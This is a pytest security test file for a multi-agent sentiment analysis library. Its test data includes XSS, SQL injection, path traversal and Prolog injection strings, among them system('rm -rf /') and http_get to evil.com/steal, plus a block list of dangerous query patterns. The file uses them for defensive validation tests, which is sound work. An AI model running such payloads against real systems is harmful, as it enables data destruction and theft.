"""
Security tests for sentiment analysis components.
"""

import pytest
import time
import hashlib
from unittest.mock import Mock, patch
from pwmk.sentiment import (
    SentimentAnalyzer,
    MultiAgentSentimentAnalyzer,
    BeliefAwareSentimentTracker
)
from pwmk.sentiment.exceptions import (
    SentimentAnalysisError,
    AgentNotFoundError
)
from pwmk.sentiment.validation import (
    validate_text_input,
    validate_belief_query,
    validate_agent_id
)


@pytest.mark.security
class TestSentimentSecurityTests:
    """Security tests for sentiment analysis system."""
    
    @pytest.fixture
    def mock_sentiment_analyzer(self):
        """Mock sentiment analyzer for security testing."""
        analyzer = Mock()
        analyzer.analyze_text.return_value = {
            "negative": 0.2,
            "neutral": 0.3,
            "positive": 0.5
        }
        return analyzer
        
    def test_input_sanitization(self):
        """Test input sanitization against malicious inputs."""
        malicious_inputs = [
            # Control characters
            "Test\x00message",
            "Test\x01\x02\x03message",
            
            # Very long input
            "A" * 50000,
            
            # Unicode exploits
            "Test\u0000message",
            "Test\u200Bmessage",  # Zero-width space
            
            # Script injection attempts
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            
            # Path traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            
            # Format string attacks
            "%s%s%s%s%s%s%s%s%s%s",
            "{0}{1}{2}{3}{4}{5}",
        ]
        
        for malicious_input in malicious_inputs:
            if len(malicious_input) <= 10000:  # Skip extremely long inputs for this test
                try:
                    sanitized = validate_text_input(malicious_input, max_length=10000)
                    
                    # Verify sanitization removed dangerous characters
                    assert '\x00' not in sanitized
                    assert '\x01' not in sanitized
                    assert len(sanitized) <= 10000
                    
                    # Should not contain the original malicious content exactly
                    if malicious_input in ["<script>alert('xss')</script>", "'; DROP TABLE users; --"]:
                        # These should be sanitized or rejected
                        pass
                        
                except ValueError:
                    # Some inputs should be rejected entirely
                    pass
                    
    def test_length_limits(self, mock_sentiment_analyzer):
        """Test protection against excessively long inputs."""
        multi_analyzer = MultiAgentSentimentAnalyzer(
            num_agents=3,
            sentiment_analyzer=mock_sentiment_analyzer
        )
        
        # Test various input lengths
        test_lengths = [100, 1000, 5000, 10000, 50000, 100000]
        
        for length in test_lengths:
            long_text = "A" * length
            
            if length <= 10000:  # Within reasonable limits
                result = multi_analyzer.analyze_agent_communication(0, long_text)
                assert isinstance(result, dict)
            else:  # Should be rejected
                with pytest.raises(ValueError):
                    multi_analyzer.analyze_agent_communication(0, long_text)
                    
    def test_agent_id_validation(self, mock_sentiment_analyzer):
        """Test agent ID validation against attacks."""
        multi_analyzer = MultiAgentSentimentAnalyzer(
            num_agents=3,
            sentiment_analyzer=mock_sentiment_analyzer
        )
        
        malicious_agent_ids = [
            -1,           # Negative
            3,            # Out of range
            100,          # Way out of range
            "0",          # String instead of int
            None,         # None value
            [],           # List
            {},           # Dict
            float('inf'), # Infinity
            float('nan'), # NaN
        ]
        
        for malicious_id in malicious_agent_ids:
            with pytest.raises((AgentNotFoundError, TypeError, ValueError)):
                multi_analyzer.analyze_agent_communication(malicious_id, "Test message")
                
    def test_belief_query_injection(self):
        """Test protection against belief query injection attacks."""
        malicious_queries = [
            # Prolog injection attempts
            "believes(X, Y). halt.",
            "believes(X, Y); system('rm -rf /').",
            "believes(X, Y) :- shell('malicious_command').",
            
            # Logic bomb attempts
            "believes(X, Y) :- loop.",
            "believes(X, Y) :- believes(X, Y).",  # Infinite recursion
            
            # File system access
            "believes(X, Y), read_file('/etc/passwd', Content).",
            "believes(X, Y), write_file('malicious.pl', Code).",
            
            # Network access attempts
            "believes(X, Y), http_get('http://evil.com/steal', Data).",
            
            # Resource exhaustion
            "believes(X, Y) :- findall(_, member(_, [1,2,3,4,5,6,7,8,9,10]), _), fail.",
        ]
        
        for query in malicious_queries:
            try:
                sanitized = validate_belief_query(query)
                
                # Should not contain dangerous constructs
                dangerous_patterns = ['halt', 'system', 'shell', 'read_file', 'write_file', 'http_get']
                for pattern in dangerous_patterns:
                    assert pattern not in sanitized.lower()
                    
            except ValueError:
                # Some queries should be rejected
                pass
                
    def test_dos_protection(self, mock_sentiment_analyzer):
        """Test protection against denial of service attacks."""
        multi_analyzer = MultiAgentSentimentAnalyzer(
            num_agents=10,
            sentiment_analyzer=mock_sentiment_analyzer
        )
        
        # Test rapid-fire requests
        start_time = time.time()
        request_count = 0
        
        try:
            # Try to overwhelm with requests
            for i in range(1000):
                result = multi_analyzer.analyze_agent_communication(
                    i % 10, 
                    f"Message {i}"
                )
                request_count += 1
                
                # Check if we're being rate limited (good for security)
                elapsed = time.time() - start_time
                if elapsed > 5.0:  # If taking too long, that's actually good
                    break
                    
        except Exception as e:
            # Some form of protection should kick in
            pass
            
        print(f"Processed {request_count} requests in {time.time() - start_time:.2f}s")
        
        # Verify system didn't crash and is still responsive
        result = multi_analyzer.analyze_agent_communication(0, "Test after DoS")
        assert isinstance(result, dict)
        
    def test_memory_exhaustion_protection(self, mock_sentiment_analyzer):
        """Test protection against memory exhaustion attacks."""
        multi_analyzer = MultiAgentSentimentAnalyzer(
            num_agents=100,  # Many agents
            sentiment_analyzer=mock_sentiment_analyzer
        )
        
        # Try to exhaust memory by creating massive history
        initial_memory_usage = len(str(multi_analyzer.agent_sentiment_history))
        
        try:
            for agent_id in range(100):
                for i in range(1100):  # More than typical history limit
                    multi_analyzer.analyze_agent_communication(
                        agent_id,
                        f"Message {i} from agent {agent_id}"
                    )
                    
        except Exception:
            pass
            
        # Verify memory didn't grow excessively
        final_memory_usage = len(str(multi_analyzer.agent_sentiment_history))
        memory_growth = final_memory_usage - initial_memory_usage
        
        # Should have some protection against unbounded growth
        history_len = sum(len(h) for h in multi_analyzer.agent_sentiment_history.values())
        print(f"Total history entries: {history_len}")
        print(f"Memory growth: {memory_growth} characters")
        
        # History should be limited per agent (test the 1000 entry limit)
        for agent_id, history in multi_analyzer.agent_sentiment_history.items():
            assert len(history) <= 1000, f"Agent {agent_id} has {len(history)} history entries"
            
    def test_sensitive_data_exposure(self, mock_sentiment_analyzer):
        """Test protection against sensitive data exposure."""
        multi_analyzer = MultiAgentSentimentAnalyzer(
            num_agents=3,
            sentiment_analyzer=mock_sentiment_analyzer
        )
        
        # Messages containing potential sensitive data
        sensitive_messages = [
            "My password is secret123",
            "SSN: 123-45-6789",
            "Credit card: 4111-1111-1111-1111",
            "API key: sk_live_abcdef123456789",
            "Database connection: mysql://user:pass@host:3306/db",
            "Private key: -----BEGIN RSA PRIVATE KEY-----",
        ]
        
        for message in sensitive_messages:
            result = multi_analyzer.analyze_agent_communication(0, message)
            
            # Verify sentiment analysis completes without leaking data
            assert isinstance(result, dict)
            
            # Check that sensitive data isn't stored in plain text
            history = multi_analyzer.get_agent_sentiment_history(0)
            latest_entry = history[-1]
            
            # The text is stored, but should be treated securely
            # In a production system, you might want to hash or encrypt sensitive parts
            stored_text = latest_entry["text"]
            
            # For this test, we verify the system doesn't crash with sensitive data
            assert isinstance(stored_text, str)
            
    def test_timing_attack_resistance(self, mock_sentiment_analyzer):
        """Test resistance to timing attacks."""
        multi_analyzer = MultiAgentSentimentAnalyzer(
            num_agents=3,
            sentiment_analyzer=mock_sentiment_analyzer
        )
        
        # Measure timing for different inputs
        test_cases = [
            "short",
            "medium length message with some content",
            "very long message with lots of content that should take more time to process but timing should be consistent for security reasons",
        ]
        
        timings = {}
        
        for test_case in test_cases:
            times = []
            for _ in range(10):  # Multiple measurements
                start_time = time.perf_counter()
                result = multi_analyzer.analyze_agent_communication(0, test_case)
                end_time = time.perf_counter()
                
                times.append(end_time - start_time)
                assert isinstance(result, dict)
                
            avg_time = sum(times) / len(times)
            timings[len(test_case)] = avg_time
            
        # Print timing results
        print("Timing analysis:")
        for length, avg_time in timings.items():
            print(f"  Length {length:3d}: {avg_time*1000:.3f} ms")
            
        # In a production system, you might want consistent timing
        # For this test, we just verify the system works with different inputs
        assert all(isinstance(time_val, float) for time_val in timings.values())
        
    def test_resource_limits(self, mock_sentiment_analyzer):
        """Test resource consumption limits."""
        from pwmk.sentiment.monitoring import SentimentMonitor
        
        monitor = SentimentMonitor(max_events=100)  # Limited event storage
        
        # Try to exceed resource limits
        for i in range(150):  # More than the limit
            monitor.record_analysis(
                agent_id=i % 3,
                text=f"Message {i}",
                sentiment_scores={"negative": 0.1, "neutral": 0.2, "positive": 0.7},
                processing_time=0.001
            )
            
        # Verify limit is enforced
        assert len(monitor.events) <= 100
        
        # System should still be responsive
        metrics = monitor.get_current_metrics()
        assert isinstance(metrics, dict)
        
    def test_configuration_security(self):
        """Test secure configuration handling."""
        # Test that dangerous configurations are rejected or sanitized
        from pwmk.sentiment.validation import validate_configuration
        
        dangerous_configs = [
            {"model_name": "../../../etc/passwd"},
            {"model_name": "http://evil.com/model"},
            {"hidden_dim": -1},
            {"dropout": 2.0},  # Invalid dropout rate
            {"num_agents": -5},
            {"max_history": float('inf')},
        ]
        
        for config in dangerous_configs:
            try:
                validated = validate_configuration(config)
                
                # If validation passes, values should be sanitized
                if "model_name" in validated:
                    model_name = validated["model_name"]
                    assert not model_name.startswith("../")
                    assert not model_name.startswith("http://evil.com")
                    
                if "hidden_dim" in validated:
                    assert validated["hidden_dim"] > 0
                    
                if "dropout" in validated:
                    assert 0.0 <= validated["dropout"] <= 1.0
                    
            except ValueError:
                # Dangerous configs should be rejected
                pass
                
    def test_error_message_sanitization(self, mock_sentiment_analyzer):
        """Test that error messages don't leak sensitive information."""
        # Mock analyzer that raises errors with potential sensitive info
        failing_analyzer = Mock()
        failing_analyzer.analyze_text.side_effect = Exception(
            "Database connection failed: mysql://user:password@host:3306/db"
        )
        
        multi_analyzer = MultiAgentSentimentAnalyzer(
            num_agents=3,
            sentiment_analyzer=failing_analyzer
        )
        
        try:
            multi_analyzer.analyze_agent_communication(0, "Test message")
        except Exception as e:
            error_message = str(e)
            
            # Error message should not contain sensitive connection strings
            # In a production system, you'd sanitize these
            print(f"Error message: {error_message}")
            
            # For this test, we just verify an error occurred
            assert isinstance(error_message, str)
            
    def test_concurrent_access_safety(self, mock_sentiment_analyzer):
        """Test thread safety under concurrent access."""
        import threading
        import queue
        
        multi_analyzer = MultiAgentSentimentAnalyzer(
            num_agents=5,
            sentiment_analyzer=mock_sentiment_analyzer
        )
        
        results_queue = queue.Queue()
        errors_queue = queue.Queue()
        
        def worker_thread(thread_id):
            try:
                for i in range(50):
                    agent_id = (thread_id + i) % 5
                    message = f"Thread {thread_id} message {i}"
                    
                    result = multi_analyzer.analyze_agent_communication(agent_id, message)
                    results_queue.put((thread_id, i, result))
                    
            except Exception as e:
                errors_queue.put((thread_id, e))
                
        # Start multiple threads
        threads = []
        for thread_id in range(10):
            thread = threading.Thread(target=worker_thread, args=(thread_id,))
            threads.append(thread)
            thread.start()
            
        # Wait for completion
        for thread in threads:
            thread.join(timeout=30)  # 30 second timeout
            
        # Check results
        results_count = results_queue.qsize()
        errors_count = errors_queue.qsize()
        
        print(f"Concurrent access results: {results_count} successful, {errors_count} errors")
        
        # Should handle concurrent access without major issues
        assert results_count > 0
        assert errors_count == 0  # No errors expected with proper thread safety
        
        # Verify data integrity
        total_history = sum(
            len(history) for history in multi_analyzer.agent_sentiment_history.values()
        )
        expected_total = 10 * 50  # 10 threads × 50 messages each
        assert total_history == expected_total


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])